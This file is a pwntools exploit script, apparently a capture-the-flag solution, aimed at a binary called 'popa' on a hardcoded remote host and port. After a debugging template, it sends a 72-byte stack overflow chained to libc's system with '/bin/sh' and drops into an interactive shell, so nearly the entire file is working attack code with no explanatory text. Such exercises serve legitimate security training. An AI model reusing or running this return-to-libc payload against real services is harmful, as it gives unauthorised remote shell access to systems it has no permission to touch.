#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./demo2 --host 127.0.0.1 --port 1234
from pwn import *
from struct import unpack
# Set up pwntools for the correct architecture
exe = context.binary = ELF('./popa')

if exe.bits == 32:
    lindbg = "/root/linux_server"
else:
    lindbg = "/root/linux_server64"


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '109.233.56.90'
port = int(args.PORT or 11673)
    
def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.EDB:
        return process(['edb', '--run', exe.path] + argv, *a, **kw)
    elif args.QIRA:
        return process(['qira', exe.path] + argv, *a, **kw)
    elif args.IDA:
        return process([lindbg], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO   
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments
addr_f = 0x4011b3
libc_base = 0x7ffff7de4000
binsh = 0x18a156
system = 0x48f20
io = start()
io.recv()
io.send(72*b'a'+p64(addr_f)+p64(libc_base+binsh)+p64(libc_base+system))
io.interactive()    
